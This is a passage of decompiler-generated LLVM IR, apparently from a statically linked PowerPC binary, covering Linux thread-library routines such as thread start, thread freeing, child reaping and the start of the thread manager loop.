  %v0_10005a50 = phi i32 [ %v0_10005a50.pre, %dec_label_pc_100059f4.dec_label_pc_10005a44_crit_edge ], [ %v2_10005a28, %dec_label_pc_10005a18 ], [ %v0_10005a34, %dec_label_pc_10005a34 ]
  ret i32 %v0_10005a50

; uselistorder directives
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder label %dec_label_pc_10005a44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100059f4, { 1, 0 }
}

define i32 @pthread_kill_all_threads(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005a9c:
  %v3_10005a9c = icmp eq i32 %arg2, 0
  br i1 %v3_10005a9c, label %dec_label_pc_10005aac, label %dec_label_pc_10005aa4

dec_label_pc_10005aa4:                            ; preds = %dec_label_pc_10005a9c
  %v3_10005a70 = load i32, i32* @global_var_1002c254, align 4
  %v1_10005aa4 = add i32 %v3_10005a70, 20
  %v2_10005aa4 = inttoptr i32 %v1_10005aa4 to i32*
  %v3_10005aa4 = load i32, i32* %v2_10005aa4, align 4
  store i32 268458668, i32* @lr, align 4
  %v2_10005aa8 = call i32 @kill(i32 %v3_10005aa4, i32 %arg1)
  br label %dec_label_pc_10005aac

dec_label_pc_10005aac:                            ; preds = %dec_label_pc_10005a9c, %dec_label_pc_10005aa4
  %v0_10005abc = phi i32 [ %arg1, %dec_label_pc_10005a9c ], [ %v2_10005aa8, %dec_label_pc_10005aa4 ]
  ret i32 %v0_10005abc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005aac, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268458716, i32* @lr, align 4
  %v0_10005ad8 = call i32 @__libc_getpid()
  %v1_10005adc = load i32, i32* @r31, align 4
  %v2_10005adc = add i32 %v1_10005adc, 20
  %v3_10005adc = inttoptr i32 %v2_10005adc to i32*
  store i32 %v0_10005ad8, i32* %v3_10005adc, align 4
  %v0_10005ae0 = load i32, i32* @r31, align 4
  %v1_10005ae0 = add i32 %v0_10005ae0, 100
  store i32 268458736, i32* @lr, align 4
  %v3_10005aec = call i32 @__GI_sigprocmask(i32 2, i32 %v1_10005ae0, i32 0)
  %v0_10005af0 = load i32, i32* @r31, align 4
  %v1_10005af0 = add i32 %v0_10005af0, 228
  %v2_10005af0 = inttoptr i32 %v1_10005af0 to i32*
  %v3_10005af0 = load i32, i32* %v2_10005af0, align 4
  %v1_10005af4 = icmp slt i32 %v3_10005af0, 0
  br i1 %v1_10005af4, label %dec_label_pc_10005b08, label %dec_label_pc_10005afc

dec_label_pc_10005afc:                            ; preds = %entry
  br label %dec_label_pc_10005b2c

dec_label_pc_10005b08:                            ; preds = %entry
  %v3_10005b0c = load i32, i32* @global_var_10027c78.200, align 4
  %tmp7 = icmp slt i32 %v3_10005b0c, 1
  br i1 %tmp7, label %dec_label_pc_10005b30, label %dec_label_pc_10005b18

dec_label_pc_10005b18:                            ; preds = %dec_label_pc_10005b08
  br label %dec_label_pc_10005b2c

dec_label_pc_10005b2c:                            ; preds = %dec_label_pc_10005afc, %dec_label_pc_10005b18
  store i32 268458800, i32* @lr, align 4
  %v0_10005b2c = call i32 @sched_setscheduler()
  br label %dec_label_pc_10005b30

dec_label_pc_10005b30:                            ; preds = %dec_label_pc_10005b08, %dec_label_pc_10005b2c
  %v3_10005b34 = load i32, i32* @global_var_1002c368.164, align 4
  %v3_10005b38 = icmp eq i32 %v3_10005b34, 0
  br i1 %v3_10005b38, label %dec_label_pc_10005b90, label %dec_label_pc_10005b40

dec_label_pc_10005b40:                            ; preds = %dec_label_pc_10005b30
  %v3_10005b44 = load i32, i32* @global_var_1002c280.138, align 4
  %tmp8 = icmp slt i32 %v3_10005b44, 1
  br i1 %tmp8, label %dec_label_pc_10005b90, label %dec_label_pc_10005b50

dec_label_pc_10005b50:                            ; preds = %dec_label_pc_10005b40
  %v0_10005b54 = load i32, i32* @r31, align 4
  store i32 %v0_10005b54, i32* %stack_var_-164, align 4
  %v2_10005b60 = ptrtoint i32* %stack_var_-164 to i32
  br label %dec_label_pc_10005b5c

dec_label_pc_10005b5c:                            ; preds = %dec_label_pc_10005b78, %dec_label_pc_10005b50
  %v3_10005b64 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 268458864, i32* @lr, align 4
  %v2_10005b6c = call i32 @__libc_write(i32 %v3_10005b64, i32 %v2_10005b60)
  %v3_10005b70 = icmp eq i32 %v2_10005b6c, -1
  br i1 %v3_10005b70, label %dec_label_pc_10005b78, label %dec_label_pc_10005b88

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b5c
  %v0_10005b78 = call i32 @__errno_location()
  %v1_10005b7c = inttoptr i32 %v0_10005b78 to i32*
  %v2_10005b7c = load i32, i32* %v1_10005b7c, align 4
  %v3_10005b80 = icmp eq i32 %v2_10005b7c, 4
  br i1 %v3_10005b80, label %dec_label_pc_10005b5c, label %dec_label_pc_10005b88

dec_label_pc_10005b88:                            ; preds = %dec_label_pc_10005b5c, %dec_label_pc_10005b78
  %v0_10005b88 = load i32, i32* @r31, align 4
  store i32 %v0_10005b88, i32* @r3, align 4
  store i32 268458896, i32* @lr, align 4
  %v0_10005b8c = call i32 @__pthread_wait_for_restart_signal()
  br label %dec_label_pc_10005b90

dec_label_pc_10005b90:                            ; preds = %dec_label_pc_10005b40, %dec_label_pc_10005b30, %dec_label_pc_10005b88
  %v0_10005b90 = load i32, i32* @r31, align 4
  %v1_10005b94 = add i32 %v0_10005b90, 92
  %v2_10005b94 = inttoptr i32 %v1_10005b94 to i32*
  %v3_10005b94 = load i32, i32* %v2_10005b94, align 4
  call void @__pseudo_call(i32 %v3_10005b94)
  %v0_10005ba4 = call i32 @__pthread_do_exit()
  ret i32 %v0_10005ba4

; uselistorder directives
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i32 ()* @sched_setscheduler, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005b90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b88, { 1, 0 }
  uselistorder label %dec_label_pc_10005b30, { 1, 0 }
  uselistorder label %dec_label_pc_10005b2c, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268458948, i32* @lr, align 4
  %v0_10005bc0 = call i32 @__libc_getpid()
  %v1_10005bc4 = load i32, i32* @r29, align 4
  %v2_10005bc4 = add i32 %v1_10005bc4, 20
  %v3_10005bc4 = inttoptr i32 %v2_10005bc4 to i32*
  store i32 %v0_10005bc0, i32* %v3_10005bc4, align 4
  store i32 0, i32* @r4, align 4
  %v0_10005bcc = load i32, i32* @r29, align 4
  %v1_10005bcc = add i32 %v0_10005bcc, 28
  %v2_10005bcc = inttoptr i32 %v1_10005bcc to i32*
  %v3_10005bcc = load i32, i32* %v2_10005bcc, align 4
  store i32 %v3_10005bcc, i32* @r3, align 4
  store i32 268458964, i32* @lr, align 4
  %v0_10005bd0 = call i32 @__pthread_lock()
  %v0_10005bd4 = load i32, i32* @r29, align 4
  %v1_10005bd4 = add i32 %v0_10005bd4, 28
  %v2_10005bd4 = inttoptr i32 %v1_10005bd4 to i32*
  %v3_10005bd4 = load i32, i32* %v2_10005bd4, align 4
  store i32 %v3_10005bd4, i32* @r3, align 4
  store i32 268458972, i32* @lr, align 4
  %v0_10005bd8 = call i32 @__pthread_unlock()
  %v0_10005bdc = load i32, i32* @r29, align 4
  %v1_10005be0 = call i32 @pthread_start_thread(i32 %v0_10005bdc)
  ret i32 %v1_10005be0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @pthread_free(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v1_10005c04 = add i32 %arg1, 16
  %v2_10005c04 = inttoptr i32 %v1_10005c04 to i32*
  %v3_10005c04 = load i32, i32* %v2_10005c04, align 4
  %v1_10005c08 = call i32 @__asm_rlwinm(i32 %v3_10005c04, i32 4, i32 18, i32 27)
  %v2_10005c0c = add i32 %v1_10005c08, ptrtoint (i32* @global_var_10027f00.170 to i32)
  store i32 %v2_10005c0c, i32* @r29, align 4
  store i32 %v2_10005c0c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10005c18.203 to i32), i32* @lr, align 4
  %v0_10005c14 = call i32 @__pthread_lock()
  %v1_10005c1c = load i32, i32* @r29, align 4
  %v2_10005c1c = add i32 %v1_10005c1c, 8
  %v3_10005c1c = inttoptr i32 %v2_10005c1c to i32*
  store i32 0, i32* %v3_10005c1c, align 4
  %v1_10005c24 = load i32, i32* @r29, align 4
  %v2_10005c24 = add i32 %v1_10005c24, 12
  %v3_10005c24 = inttoptr i32 %v2_10005c24 to i32*
  store i32 -1, i32* %v3_10005c24, align 4
  %v0_10005c28 = load i32, i32* @r29, align 4
  store i32 %v0_10005c28, i32* @r3, align 4
  store i32 268459056, i32* @lr, align 4
  %v0_10005c2c = call i32 @__pthread_unlock()
  %v3_10005c34 = load i32, i32* @global_var_1002c294.204, align 4
  %v1_10005c38 = add i32 %v3_10005c34, -1
  store i32 %v1_10005c38, i32* @global_var_1002c294.204, align 4
  %v0_10005c40 = load i32, i32* @r31, align 4
  %v1_10005c40 = add i32 %v0_10005c40, 448
  %v2_10005c40 = inttoptr i32 %v1_10005c40 to i32*
  %v3_10005c40 = load i32, i32* %v2_10005c40, align 4
  %v3_10005c507 = icmp eq i32 %v3_10005c40, 0
  store i32 %v3_10005c40, i32* @r3, align 4
  br i1 %v3_10005c507, label %dec_label_pc_10005c5c, label %dec_label_pc_10005c48

dec_label_pc_10005c48:                            ; preds = %entry, %dec_label_pc_10005c48
  %v0_10005c48 = phi i32 [ %v0_10005c50.pr, %dec_label_pc_10005c48 ], [ %v3_10005c40, %entry ]
  %v1_10005c48 = inttoptr i32 %v0_10005c48 to i32*
  %v2_10005c48 = load i32, i32* %v1_10005c48, align 4
  store i32 %v2_10005c48, i32* @r29, align 4
  store i32 268459088, i32* @lr, align 4
  %v0_10005c4c = call i32 @free()
  %v0_10005c50.pr = load i32, i32* @r29, align 4
  %v3_10005c50 = icmp eq i32 %v0_10005c50.pr, 0
  store i32 %v0_10005c50.pr, i32* @r3, align 4
  br i1 %v3_10005c50, label %dec_label_pc_10005c50.dec_label_pc_10005c5c_crit_edge, label %dec_label_pc_10005c48

dec_label_pc_10005c50.dec_label_pc_10005c5c_crit_edge: ; preds = %dec_label_pc_10005c48
  %v0_10005c5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005c5c

dec_label_pc_10005c5c:                            ; preds = %dec_label_pc_10005c50.dec_label_pc_10005c5c_crit_edge, %entry
  %v0_10005c5c = phi i32 [ %v0_10005c5c.pre, %dec_label_pc_10005c50.dec_label_pc_10005c5c_crit_edge ], [ %v0_10005c40, %entry ]
  %v1_10005c5c = add i32 %v0_10005c5c, 452
  %v2_10005c5c = inttoptr i32 %v1_10005c5c to i32*
  %v3_10005c5c = load i32, i32* %v2_10005c5c, align 4
  %v3_10005c6c3 = icmp eq i32 %v3_10005c5c, 0
  store i32 %v3_10005c5c, i32* @r3, align 4
  br i1 %v3_10005c6c3, label %dec_label_pc_10005c78, label %dec_label_pc_10005c64

dec_label_pc_10005c64:                            ; preds = %dec_label_pc_10005c5c, %dec_label_pc_10005c64
  %v0_10005c64 = phi i32 [ %v0_10005c6c.pr, %dec_label_pc_10005c64 ], [ %v3_10005c5c, %dec_label_pc_10005c5c ]
  %v1_10005c64 = inttoptr i32 %v0_10005c64 to i32*
  %v2_10005c64 = load i32, i32* %v1_10005c64, align 4
  store i32 %v2_10005c64, i32* @r29, align 4
  store i32 268459116, i32* @lr, align 4
  %v0_10005c68 = call i32 @free()
  %v0_10005c6c.pr = load i32, i32* @r29, align 4
  %v3_10005c6c = icmp eq i32 %v0_10005c6c.pr, 0
  store i32 %v0_10005c6c.pr, i32* @r3, align 4
  br i1 %v3_10005c6c, label %dec_label_pc_10005c6c.dec_label_pc_10005c78_crit_edge, label %dec_label_pc_10005c64

dec_label_pc_10005c6c.dec_label_pc_10005c78_crit_edge: ; preds = %dec_label_pc_10005c64
  %v0_10005c80.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005c78

dec_label_pc_10005c78:                            ; preds = %dec_label_pc_10005c6c.dec_label_pc_10005c78_crit_edge, %dec_label_pc_10005c5c
  %v0_10005ca0 = phi i32 [ %v0_10005c80.pre, %dec_label_pc_10005c6c.dec_label_pc_10005c78_crit_edge ], [ %v0_10005c5c, %dec_label_pc_10005c5c ]
  %v4_10005c80 = icmp eq i32 %v0_10005ca0, ptrtoint (i32* @global_var_10027a80 to i32)
  br i1 %v4_10005c80, label %dec_label_pc_10005cb8, label %dec_label_pc_10005c88

dec_label_pc_10005c88:                            ; preds = %dec_label_pc_10005c78
  %v1_10005c88 = add i32 %v0_10005ca0, 392
  %v2_10005c88 = inttoptr i32 %v1_10005c88 to i32*
  %v3_10005c88 = load i32, i32* %v2_10005c88, align 4
  %v3_10005c8c = icmp eq i32 %v3_10005c88, 0
  br i1 %v3_10005c8c, label %dec_label_pc_10005c94, label %dec_label_pc_10005cb8

dec_label_pc_10005c94:                            ; preds = %dec_label_pc_10005c88
  %v1_10005c94 = add i32 %v0_10005ca0, 400
  %v2_10005c94 = inttoptr i32 %v1_10005c94 to i32*
  %v3_10005c94 = load i32, i32* %v2_10005c94, align 4
  %v3_10005c98 = icmp eq i32 %v3_10005c94, 0
  br i1 %v3_10005c98, label %dec_label_pc_10005ca8, label %dec_label_pc_10005ca0

dec_label_pc_10005ca0:                            ; preds = %dec_label_pc_10005c94
  %v1_10005ca0 = add i32 %v0_10005ca0, 396
  %v2_10005ca0 = inttoptr i32 %v1_10005ca0 to i32*
  %v3_10005ca0 = load i32, i32* %v2_10005ca0, align 4
  store i32 268459176, i32* @lr, align 4
  %v2_10005ca4 = call i32 @munmap(i32 %v3_10005ca0, i32 %v3_10005c94)
  %v0_10005ca8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005ca8

dec_label_pc_10005ca8:                            ; preds = %dec_label_pc_10005c94, %dec_label_pc_10005ca0
  %v0_10005ca8 = phi i32 [ %v0_10005ca0, %dec_label_pc_10005c94 ], [ %v0_10005ca8.pre, %dec_label_pc_10005ca0 ]
  %v1_10005cb0 = add i32 %v0_10005ca8, -2096672
  store i32 268459192, i32* @lr, align 4
  %v2_10005cb4 = call i32 @munmap(i32 %v1_10005cb0, i32 2097152)
  br label %dec_label_pc_10005cb8

dec_label_pc_10005cb8:                            ; preds = %dec_label_pc_10005c88, %dec_label_pc_10005c78, %dec_label_pc_10005ca8
  %v0_10005cc8 = phi i32 [ 0, %dec_label_pc_10005c88 ], [ 0, %dec_label_pc_10005c78 ], [ %v2_10005cb4, %dec_label_pc_10005ca8 ]
  ret i32 %v0_10005cc8

; uselistorder directives
  uselistorder i32 %v0_10005c6c.pr, { 1, 2, 0 }
  uselistorder i32 %v0_10005c50.pr, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10027a80 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005cb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005ca8, { 1, 0 }
  uselistorder label %dec_label_pc_10005c64, { 1, 0 }
  uselistorder label %dec_label_pc_10005c48, { 1, 0 }
}

define i32 @restart.4() local_unnamed_addr {
entry:
  store i32 268459228, i32* @lr, align 4
  %v0_10005cd8 = call i32 @__pthread_restart_new()
  ret i32 %v0_10005cd8
}

define i32 @pthread_reap_children(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10005e08 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10005e08, i32* @r4, align 4
  store i32 268459536, i32* @lr, align 4
  %v3_10005e0c9 = call i32 @__libc_waitpid(i32 -1, i32 %v2_10005e08, i32 -2147483647)
  %v2_10005e1010 = icmp sgt i32 %v3_10005e0c9, 0
  br i1 %v2_10005e1010, label %dec_label_pc_10005dac, label %dec_label_pc_10005e18

dec_label_pc_10005dac:                            ; preds = %entry, %dec_label_pc_10005dfc.backedge
  %v3_10005db0 = load i32, i32* @global_var_1002c350.202, align 4
  %v3_10005db4 = icmp eq i32 %v3_10005db0, 0
  br i1 %v3_10005db4, label %dec_label_pc_10005dd4, label %dec_label_pc_10005dbc

dec_label_pc_10005dbc:                            ; preds = %dec_label_pc_10005dac
  %v3_10005d04 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_10005d04, i32* @r3, align 4
  store i32 268459476, i32* @lr, align 4
  %v0_10005dd0 = call i32 @restart.4()
  br label %dec_label_pc_10005dd4

dec_label_pc_10005dd4:                            ; preds = %dec_label_pc_10005dac, %dec_label_pc_10005dbc
  %v3_10005dd4 = load i32, i32* %stack_var_-40, align 4
  %v1_10005dd8 = urem i32 %v3_10005dd4, 128
  %v1_10005ddc = mul nuw nsw i32 %v1_10005dd8, 16777216
  %v1_10005de0 = add nuw i32 %v1_10005ddc, 16777216
  %v2_10005de0 = sdiv i32 %v1_10005de0, 16777216
  %v1_10005de4 = udiv i32 %v2_10005de0, 2
  %v2_10005de4 = and i32 %v2_10005de0, -2147483648
  %v3_10005de4 = or i32 %v1_10005de4, %v2_10005de4
  %tmp8 = icmp slt i32 %v3_10005de4, 1
  br i1 %tmp8, label %dec_label_pc_10005dfc.backedge, label %dec_label_pc_10005dec

dec_label_pc_10005dec:                            ; preds = %dec_label_pc_10005dd4
  store i32 ptrtoint ([3 x i8]* @global_var_10005df4.206 to i32), i32* @lr, align 4
  %v2_10005df0 = call i32 @pthread_kill_all_threads(i32 %v1_10005dd8, i32 1)
  %v1_10005df8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005dfc.backedge

dec_label_pc_10005dfc.backedge:                   ; preds = %dec_label_pc_10005dec, %dec_label_pc_10005dd4
  store i32 -2147483647, i32* @r5, align 4
  store i32 %v2_10005e08, i32* @r4, align 4
  store i32 268459536, i32* @lr, align 4
  %v3_10005e0c = call i32 @__libc_waitpid(i32 -1, i32 %v2_10005e08, i32 -2147483647)
  %v2_10005e10 = icmp sgt i32 %v3_10005e0c, 0
  br i1 %v2_10005e10, label %dec_label_pc_10005dac, label %dec_label_pc_10005e18

dec_label_pc_10005e18:                            ; preds = %dec_label_pc_10005dfc.backedge, %entry
  %v3_10005e0c.lcssa = phi i32 [ %v3_10005e0c9, %entry ], [ %v3_10005e0c, %dec_label_pc_10005dfc.backedge ]
  ret i32 %v3_10005e0c.lcssa

; uselistorder directives
  uselistorder i32 %v2_10005de0, { 1, 0 }
  uselistorder i32 %v2_10005e08, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 0, 1 }
  uselistorder i32 268459536, { 1, 0 }
  uselistorder i32 -2147483647, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10005dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10005dac, { 1, 0 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  store i32 268566528, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027c60.156 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027ca8.207 to i32), i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10027cb0.208 to i32), i32* %r0.global-to-local, align 4
  %v2_10005e4c = ptrtoint i32* %stack_var_-352 to i32
  store i32 ptrtoint (i32* @global_var_10027cb0.208 to i32), i32* @global_var_10027cac.209, align 4
  store i32 ptrtoint (i32* @global_var_10027c60.156 to i32), i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_10027ca8.207 to i32), i32* bitcast (i32** @global_var_10027ca4.210 to i32*), align 4
  store i32 %arg1, i32* %r21.global-to-local, align 4
  store i32 %v2_10005e4c, i32* %r3.global-to-local, align 4
  store i32 268459624, i32* @lr, align 4
  %v1_10005e64 = call i32 @sigfillset(i32 %v2_10005e4c)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005e6c = load i32, i32* @global_var_1002c27c.137, align 4
  store i32 %v3_10005e6c, i32* %r4.global-to-local, align 4
  store i32 %v2_10005e4c, i32* @r3, align 4
  store i32 268459640, i32* @lr, align 4
  %v1_10005e74 = call i32 @__GI_sigdelset(i32 %v2_10005e4c)
  store i32 %v2_10005e4c, i32* @r3, align 4
  store i32 5, i32* %r4.global-to-local, align 4
  store i32 268459652, i32* @lr, align 4
  %v1_10005e80 = call i32 @__GI_sigdelset(i32 %v2_10005e4c)
  store i32 %v1_10005e80, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005e88 = load i32, i32* @global_var_1002c368.164, align 4
  store i32 %v3_10005e88, i32* %r0.global-to-local, align 4
  %v3_10005e8c = icmp eq i32 %v3_10005e88, 0
  store i1 %v3_10005e8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005e8c, label %dec_label_pc_10005eac, label %dec_label_pc_10005e94

dec_label_pc_10005e94:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005e98 = load i32, i32* @global_var_1002c280.138, align 4
  store i32 %v3_10005e98, i32* %r4.global-to-local, align 4
  %v3_10005e9c = icmp eq i32 %v3_10005e98, 0
  store i1 %v3_10005e9c, i1* %cr7_eq.global-to-local, align 1
  %tmp26 = icmp slt i32 %v3_10005e98, 1
  br i1 %tmp26, label %dec_label_pc_10005eac, label %dec_label_pc_10005ea4

dec_label_pc_10005ea4:                            ; preds = %dec_label_pc_10005e94
  store i32 %v2_10005e4c, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005eac.211 to i32), i32* @lr, align 4
  %v1_10005ea8 = call i32 @__GI_sigdelset(i32 %v2_10005e4c)
  store i32 %v1_10005ea8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005eac

dec_label_pc_10005eac:                            ; preds = %dec_label_pc_10005e94, %entry, %dec_label_pc_10005ea4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_10005e4c, i32* %r4.global-to-local, align 4
  store i32 268459708, i32* @lr, align 4
  %v3_10005eb8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10005e4c, i32 0)
  store i32 %v3_10005eb8, i32* %r3.global-to-local, align 4
  %v3_10005ec0 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_10005ec0, i32* %r9.global-to-local, align 4
  %v1_10005ec4 = add i32 %v3_10005ec0, 24
  %v2_10005ec4 = inttoptr i32 %v1_10005ec4 to i32*
  %v3_10005ec4 = load i32, i32* %v2_10005ec4, align 4
  store i32 %v3_10005ec4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005ecc.212 to i32), i32* @lr, align 4
  %v1_10005ec8 = call i32 @__pthread_manager_adjust_prio(i32 %v3_10005ec4)
  store i32 %v1_10005ec8, i32* %r3.global-to-local, align 4
  %v2_10005ecc = ptrtoint i32* %stack_var_-224 to i32
  br label %dec_label_pc_10005ecc

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005ee8, %dec_label_pc_10005eac
  %v0_10005ed0 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10005ed0, i32* %r3.global-to-local, align 4
  store i32 %v2_10005ecc, i32* %r4.global-to-local, align 4
  store i32 268459744, i32* @lr, align 4
  %v1_10005edc = call i32 @__libc_read(i32 %v0_10005ed0)
  store i32 %v1_10005edc, i32* %r3.global-to-local, align 4
  %v3_10005ee0 = icmp eq i32 %v1_10005edc, -1
  store i1 %v3_10005ee0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005ee0, label %dec_label_pc_10005ee8, label %dec_label_pc_10005ef8

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005ecc
  %v0_10005ee8 = call i32 @__errno_location()
  store i32 %v0_10005ee8, i32* %r3.global-to-local, align 4
  %v1_10005eec = inttoptr i32 %v0_10005ee8 to i32*
  %v2_10005eec = load i32, i32* %v1_10005eec, align 4
  store i32 %v2_10005eec, i32* %r0.global-to-local, align 4
  %v3_10005ef0 = icmp eq i32 %v2_10005eec, 4
  store i1 %v3_10005ef0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005ef0, label %dec_label_pc_10005ecc, label %dec_label_pc_10005ef8

dec_label_pc_10005ef8:                            ; preds = %dec_label_pc_10005ecc, %dec_label_pc_10005ee8
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10005efc = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_10005efc, i32* %stack_var_-360, align 4
  %v2_10005f0c = ptrtoint i32* %stack_var_-360 to i32
  %v4_10005f58 = zext i16 %tmp17 to i32
  %tmp = urem i16 %tmp17, 2
  %v1_10005f5c = zext i16 %tmp to i32
  %v3_10005f5c = icmp eq i16 %tmp, 0
  %v2_10005f78 = icmp ugt i32 %tmp16, 5
  %v3_10005f78 = icmp eq i32 %tmp16, 5
  %v2_10006214 = ptrtoint i32* %stack_var_-204 to i32
  %v1_10005f84 = mul i32 %tmp16, 4
  %v2_10005f8c = add i32 %v1_10005f84, ptrtoint (i32* @global_var_10015cd0.214 to i32)
  %v3_10005f8c = inttoptr i32 %v2_10005f8c to i32*
  br label %dec_label_pc_10005f04

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005f50, %dec_label_pc_10005f64, %dec_label_pc_10005f58, %dec_label_pc_100064c4, %dec_label_pc_10005ef8
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 %v2_10005f0c, i32* %r3.global-to-local, align 4
  store i32 268459796, i32* @lr, align 4
  %v3_10005f10 = call i32 @__libc_poll(i32 %v2_10005f0c, i32 1, i32 2000)
  store i32 %v3_10005f10, i32* %r3.global-to-local, align 4
  store i32 %v3_10005f10, i32* @r31, align 4
  store i32 268459804, i32* @lr, align 4
  %v0_10005f18 = call i32 @getppid()
  store i32 %v0_10005f18, i32* %r3.global-to-local, align 4
  %v3_10005f1c = icmp eq i32 %v0_10005f18, 1
  store i1 %v3_10005f1c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005f1c, label %dec_label_pc_10005f24, label %dec_label_pc_10005f34

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005f04
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10005f30.213 to i32), i32* @lr, align 4
  %v2_10005f2c = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000649c = call i32 @__GI__exit(i32 0)
  store i32 %v1_1000649c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @global_var_1002c350.202, align 4
  store i32 268461232, i32* @lr, align 4
  %v2_100064ac = call i32 @pthread_reap_children(i32 %v1_1000649c, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v3_100064b4 = load i32, i32* @global_var_1002c254, align 4
  store i32 %v3_100064b4, i32* %r9.global-to-local, align 4
  store i32 %v3_100064b4, i32* @r3, align 4
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100064c4

dec_label_pc_10005f34:                            ; preds = %dec_label_pc_10005f04
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005f38 = load i32, i32* @global_var_1002c34c.201, align 4
  store i32 %v3_10005f38, i32* %r0.global-to-local, align 4
  %v3_10005f3c = icmp eq i32 %v3_10005f38, 0
  store i1 %v3_10005f3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10005f3c, label %dec_label_pc_10005f50, label %dec_label_pc_10005f44

dec_label_pc_10005f44:                            ; preds = %dec_label_pc_10005f34
  store i32 0, i32* %r0.global-to-local, align 4
